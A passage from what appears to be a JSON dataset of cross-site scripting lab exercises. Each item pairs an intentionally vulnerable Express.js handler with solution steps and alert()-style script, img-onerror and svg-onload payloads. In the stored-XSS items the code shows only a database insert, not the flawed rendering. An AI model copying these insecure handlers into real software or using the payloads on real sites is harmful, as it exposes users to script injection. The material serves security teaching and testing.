        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create achievement: <script>alert('Fitness')</script>.",
            "View achievements to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-achievement', (req, res) => {\n  const achievement = req.body.achievement;\n  db.query(\"INSERT INTO achievements (name) VALUES (?)\", [achievement]);\n  res.send('Achievement added');\n});",
        "payloads": [
            "<script>alert('Fitness')</script>",
            "<img src=x onerror=alert('Achievement')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in scholarship application form",
        "Lab Description": "Scholarship applicant names are reflected into confirmation page without escaping, allowing XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('ScholarshipXSS')</script>.",
            "Observe XSS execution on confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-scholarship', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Applicant: ${name}</div>`);\n});",
        "payloads": [
            "<script>alert('ScholarshipXSS')</script>",
            "<svg/onload=alert('Scholar')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug bounty platform report comments",
        "Lab Description": "Bug reporters can leave public comments. Comments are stored without sanitization, enabling persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment: <script>alert('BugBounty')</script>.",
            "Observe payload execution on report page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO bounty_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
        "payloads": [
            "<script>alert('BugBounty')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online donation acknowledgment page",
        "Lab Description": "Donation forms reflect donor name without escaping, leading to reflected XSS when showing acknowledgment.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit donor name: <script>alert('DonorXSS')</script>.",
            "Observe script execution on acknowledgment page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/acknowledge-donation', (req, res) => {\n  const donor = req.body.donor;\n  res.send(`<p>Thank you ${donor} for your donation!</p>`);\n});",
        "payloads": [
            "<script>alert('DonorXSS')</script>",
            "<svg/onload=alert('Donor')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in recipe sharing platform ingredients field",
        "Lab Description": "Users can submit recipes with ingredients. The ingredients field is stored without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a recipe with ingredients: <script>alert('RecipeXSS')</script>.",
            "Reload recipe page and observe payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const ingredients = req.body.ingredients;\n  db.query(\"INSERT INTO recipes (ingredients) VALUES (?)\", [ingredients]);\n  res.send('Recipe submitted');\n});",
        "payloads": [
            "<script>alert('RecipeXSS')</script>",
            "<img src=x onerror=alert('Recipe')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in university admission application form",
        "Lab Description": "Applicants' names are reflected on the confirmation page without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('AdmissionXSS')</script>.",
            "Observe execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-application', (req, res) => {\n  const applicant = req.body.applicant;\n  res.send(`<div>Application received for ${applicant}</div>`);\n});",
        "payloads": [
            "<script>alert('AdmissionXSS')</script>",
            "<svg/onload=alert('Admission')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in car rental service special request notes",
        "Lab Description": "Car renters can leave special requests that are stored without sanitization, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a rental request with: <script>alert('RentalXSS')</script>.",
            "Observe execution on rental confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rent-car', (req, res) => {\n  const request = req.body.request;\n  db.query(\"INSERT INTO rentals (special_requests) VALUES (?)\", [request]);\n  res.send('Car rental submitted');\n});",
        "payloads": [
            "<script>alert('RentalXSS')</script>",
            "<img src=x onerror=alert('Rental')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online movie ticket booking",
        "Lab Description": "User-provided data for movie booking is reflected without sanitization, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit movie booking with: <script>alert('MovieXSS')</script>.",
            "Observe payload execution in booking confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-movie', (req, res) => {\n  const movie = req.body.movie;\n  res.send(`<h1>Booking confirmed for ${movie}</h1>`);\n});",
        "payloads": [
            "<script>alert('MovieXSS')</script>",
            "<svg/onload=alert('Movie')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in language learning platform lesson notes",
        "Lab Description": "Students can leave notes on lessons. Notes are stored and displayed without escaping, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a lesson note with: <script>alert('LanguageXSS')</script>.",
            "Observe payload execution when revisiting lesson."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO lesson_notes (content) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('LanguageXSS')</script>",
            "<img src=x onerror=alert('Lesson')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in real estate inquiry form",
        "Lab Description": "User inquiries on properties are reflected into pages without escaping, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit inquiry with: <script>alert('InquiryXSS')</script>.",
            "Observe execution on property inquiry confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-inquiry', (req, res) => {\n  const inquiry = req.body.inquiry;\n  res.send(`<p>Inquiry submitted: ${inquiry}</p>`);\n});",
        "payloads": [
            "<script>alert('InquiryXSS')</script>",
            "<svg/onload=alert('Inquiry')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in freelancing platform project description",
        "Lab Description": "Clients post project descriptions without filtering input, allowing persistent XSS on freelancer dashboards.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a project with: <script>alert('FreelanceXSS')</script>.",
            "Observe script execution on freelancer search results."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-project', (req, res) => {\n  const project = req.body.project;\n  db.query(\"INSERT INTO projects (description) VALUES (?)\", [project]);\n  res.send('Project posted');\n});",
        "payloads": [
            "<script>alert('FreelanceXSS')</script>",
            "<img src=x onerror=alert('Project')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in music streaming app song request page",
        "Lab Description": "User-submitted song requests are reflected back without escaping, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit request: <script>alert('MusicXSS')</script>.",
            "Observe execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/request-song', (req, res) => {\n  const song = req.body.song;\n  res.send(`<h2>Requested: ${song}</h2>`);\n});",
        "payloads": [
            "<script>alert('MusicXSS')</script>",
            "<svg/onload=alert('Music')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel agency review section",
        "Lab Description": "Travelers submit trip reviews. Reviews are rendered without sanitization, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a review with: <script>alert('TravelXSS')</script>.",
            "View reviews and confirm payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO travel_reviews (review) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('TravelXSS')</script>",
            "<img src=x onerror=alert('Trip')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online grocery store feedback form",
        "Lab Description": "Customer feedback is reflected into a thank-you page without encoding, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback: <script>alert('GroceryXSS')</script>.",
            "Observe execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>Thanks for your feedback: ${feedback}</div>`);\n});",
        "payloads": [
            "<script>alert('GroceryXSS')</script>",
            "<svg/onload=alert('Grocery')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in real estate listing comments",
        "Lab Description": "Users can leave comments on property listings. Comments are stored without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a comment with <script>alert('ListingXSS')</script>.",
            "Reload the listing page and observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('ListingXSS')</script>",
            "<img src=x onerror=alert('Comment')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online job application",
        "Lab Description": "Job applicant names are reflected into the confirmation page without escaping, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name <script>alert('JobXSS')</script>.",
            "Observe script execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Application received: ${name}</h1>`);\n});",
        "payloads": [
            "<script>alert('JobXSS')</script>",
            "<svg/onload=alert('Job')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online donation message field",
        "Lab Description": "Donors can leave public messages. These are stored without sanitization, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a donation with message: <script>alert('DonationXSS')</script>.",
            "View the public donor wall and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-donation', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO donations (message) VALUES (?)\", [message]);\n  res.send('Donation received');\n});",
        "payloads": [
            "<script>alert('DonationXSS')</script>",
            "<img src=x onerror=alert('Donation')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online library book search",
        "Lab Description": "Search terms are reflected without escaping into the search result page, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Search for: <script>alert('LibraryXSS')</script>.",
            "Observe script execution in search results."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-books', (req, res) => {\n  const term = req.body.term;\n  res.send(`<h2>Results for: ${term}</h2>`);\n});",
        "payloads": [
            "<script>alert('LibraryXSS')</script>",
            "<svg/onload=alert('Library')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in car service booking notes",
        "Lab Description": "Customers can leave notes when booking car services. Notes are rendered without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Book a service with: <script>alert('ServiceXSS')</script> in the notes.",
            "View the booking page and confirm execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-service', (req, res) => {\n  const notes = req.body.notes;\n  db.query(\"INSERT INTO service_notes (notes) VALUES (?)\", [notes]);\n  res.send('Service booked');\n});",
        "payloads": [
            "<script>alert('ServiceXSS')</script>",
            "<img src=x onerror=alert('Service')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online travel booking destination field",
        "Lab Description": "Destination input is reflected without encoding into the confirmation page, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit destination <script>alert('TravelXSS')</script>.",
            "Observe execution on the booking confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-travel', (req, res) => {\n  const destination = req.body.destination;\n  res.send(`<h2>Booking for: ${destination}</h2>`);\n});",
        "payloads": [
            "<script>alert('TravelXSS')</script>",
            "<svg/onload=alert('Destination')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online fitness app workout notes",
        "Lab Description": "Users can add notes to their workouts. Notes are saved without escaping, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add a workout note: <script>alert('WorkoutXSS')</script>.",
            "Observe script execution when reviewing workouts."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-workout-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO workout_notes (note) VALUES (?)\", [note]);\n  res.send('Workout note saved');\n});",
        "payloads": [
            "<script>alert('WorkoutXSS')</script>",
            "<img src=x onerror=alert('Workout')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in book review platform author search",
        "Lab Description": "Author names are reflected into the HTML page unsanitized, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Search for author <script>alert('AuthorXSS')</script>.",
            "Observe execution in the result page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-author', (req, res) => {\n  const author = req.body.author;\n  res.send(`<p>Search results for: ${author}</p>`);\n});",
        "payloads": [
            "<script>alert('AuthorXSS')</script>",
            "<svg/onload=alert('Author')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online gadget marketplace product questions",
        "Lab Description": "Buyers can ask sellers questions about products. Questions are saved without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Ask a question: <script>alert('QuestionXSS')</script>.",
            "Seller views question and payload triggers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO product_questions (question) VALUES (?)\", [question]);\n  res.send('Question submitted');\n});",
        "payloads": [
            "<script>alert('QuestionXSS')</script>",
            "<img src=x onerror=alert('Question')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in virtual event RSVP system",
        "Lab Description": "RSVP name is reflected into event confirmation page without escaping, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "RSVP with name: <script>alert('EventXSS')</script>.",
            "Observe execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Welcome to the event, ${name}!</h1>`);\n});",
        "payloads": [
            "<script>alert('EventXSS')</script>",
            "<svg/onload=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in customer support ticket notes",
        "Lab Description": "The app allows users to submit support tickets with notes. Notes are stored and displayed to admins without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a ticket note with <script>alert('SupportXSS')</script>.",
            "Login as admin and view the ticket page.",
            "Observe script execution in note field."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO tickets (note) VALUES (?)\", [note]);\n  res.send('Ticket created');\n});",
        "payloads": [
            "<script>alert('SupportXSS')</script>",
            "<img src=x onerror=alert('NoteXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in restaurant booking confirmation",
        "Lab Description": "The app reflects the user's name in a confirmation page without escaping it properly.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book a table using name <script>alert('XSS')</script>.",
            "Observe reflected payload execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-table', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Booking confirmed for: ${name}</h2>`);\n});",
        "payloads": [
            "<script>alert('TableXSS')</script>",
            "<svg/onload=alert('Booking')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracker task description",
        "Lab Description": "Bug tracker allows users to submit bugs with descriptions. The descriptions are stored and rendered in admin dashboard without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a bug report with <script>alert('BugXSS')</script> in description.",
            "Open the admin view and confirm script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bug', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO bugs (description) VALUES (?)\", [desc]);\n  res.send('Bug submitted');\n});",
        "payloads": [
            "<script>alert('BugXSS')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in banking portal transaction description",
        "Lab Description": "Transaction description reflects user input without sanitization in the summary page.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit transaction with <script>alert('BankXSS')</script> as description.",
            "Observe execution in confirmation summary."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-transaction', (req, res) => {\n  const desc = req.body.description;\n  res.send(`<h1>Transaction: ${desc}</h1>`);\n});",
        "payloads": [
            "<script>alert('BankXSS')</script>",
            "<svg/onload=alert('Transfer')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in feedback field of medical consultation form",
        "Lab Description": "Medical consultation form saves user feedback unescaped and displays it to doctors, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback <script>alert('DoctorXSS')</script>.",
            "Login as doctor and open patient feedback.",
            "Observe XSS execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO consultations (feedback) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
        "payloads": [
            "<script>alert('DoctorXSS')</script>",
            "<img src=x onerror=alert('Medical')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in e-ticket system route name",
        "Lab Description": "Ticket route input is reflected without escaping on confirmation page.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book with route: <script>alert('TicketXSS')</script>.",
            "Observe execution in ticket confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-ticket', (req, res) => {\n  const route = req.body.route;\n  res.send(`<p>Travel route: ${route}</p>`);\n});",
        "payloads": [
            "<script>alert('TicketXSS')</script>",
            "<svg/onload=alert('Route')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in library management system review",
        "Lab Description": "Students can review books. Review content is stored and displayed without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit review <script>alert('LibraryXSS')</script>.",
            "Open the book review page and confirm execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (content) VALUES (?)\", [review]);\n  res.send('Review added');\n});",
        "payloads": [
            "<script>alert('LibraryXSS')</script>",
            "<img src=x onerror=alert('Book')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in e-commerce coupon form",
        "Lab Description": "Submitted coupon code is reflected in the result page unsanitized.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter coupon: <script>alert('CouponXSS')</script>.",
            "Observe execution on result page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-coupon', (req, res) => {\n  const code = req.body.code;\n  res.send(`<div>Applied: ${code}</div>`);\n});",
        "payloads": [
            "<script>alert('CouponXSS')</script>",
            "<svg/onload=alert('Code')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online gaming profile bio",
        "Lab Description": "Users update gaming bios. Bio is stored and shown in profile without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set bio: <script>alert('GamerXSS')</script>.",
            "Visit the profile and observe payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.body.id]);\n  res.send('Bio updated');\n});",
        "payloads": [
            "<script>alert('GamerXSS')</script>",
            "<img src=x onerror=alert('Bio')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in movie ticket booking reference field",
        "Lab Description": "Booking reference is echoed back in the final confirmation page unsanitized.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book with reference <script>alert('MovieXSS')</script>.",
            "Observe XSS on result page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const ref = req.body.ref;\n  res.send(`<p>Your reference: ${ref}</p>`);\n});",
        "payloads": [
            "<script>alert('MovieXSS')</script>",
            "<svg/onload=alert('Ref')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in contact message field",
        "Lab Description": "A contact form stores submitted messages without sanitization and displays them to admins. An attacker can inject persistent JavaScript.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit message with <script>alert('ContactXSS')</script>.",
            "Login as admin and open messages view.",
            "Observe JavaScript execution in admin panel."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO messages (content) VALUES (?)\", [msg]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('ContactXSS')</script>",
            "<img src=x onerror=alert('MsgXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in job application cover letter",
        "Lab Description": "A job portal saves user-submitted cover letters without escaping and displays them to HR staff.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit application with <script>alert('HRXSS')</script> in cover letter.",
            "Login as HR and view the application.",
            "Confirm XSS execution in HR panel."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const cover = req.body.cover;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [cover]);\n  res.send('Application submitted');\n});",
        "payloads": [
            "<script>alert('HRXSS')</script>",
            "<img src=x onerror=alert('CoverXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in personal finance note field",
        "Lab Description": "Users can add personal notes to transactions. These notes are rendered without filtering, leading to XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit note with <script>alert('FinanceXSS')</script>.",
            "Open transaction history and confirm execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
        "payloads": [
            "<script>alert('FinanceXSS')</script>",
            "<img src=x onerror=alert('NoteXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in referral system input",
        "Lab Description": "Referral codes submitted in a form are reflected in the result page without escaping, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit referral code: <script>alert('ReferralXSS')</script>.",
            "Observe code execution on thank you page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/refer', (req, res) => {\n  const code = req.body.code;\n  res.send(`<h3>Thanks for using code: ${code}</h3>`);\n});",
        "payloads": [
            "<script>alert('ReferralXSS')</script>",
            "<svg/onload=alert('Referral')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in restaurant review comment",
        "Lab Description": "Restaurant reviews allow comments that are stored and displayed without proper filtering.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment <script>alert('FoodXSS')</script>.",
            "Reload the restaurant page to trigger execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('FoodXSS')</script>",
            "<img src=x onerror=alert('Comment')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in insurance claim description",
        "Lab Description": "Insurance claim descriptions are displayed to agents with no escaping. Attackers can inject persistent scripts.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a claim with <script>alert('ClaimXSS')</script>.",
            "Login as insurance agent and review claim.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-claim', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO claims (description) VALUES (?)\", [desc]);\n  res.send('Claim submitted');\n});",
        "payloads": [
            "<script>alert('ClaimXSS')</script>",
            "<img src=x onerror=alert('Claim')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter signup name field",
        "Lab Description": "Newsletter signup form reflects the name in the thank-you message without escaping.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Signup using <script>alert('NewsletterXSS')</script> as your name.",
            "Observe the reflected XSS in confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
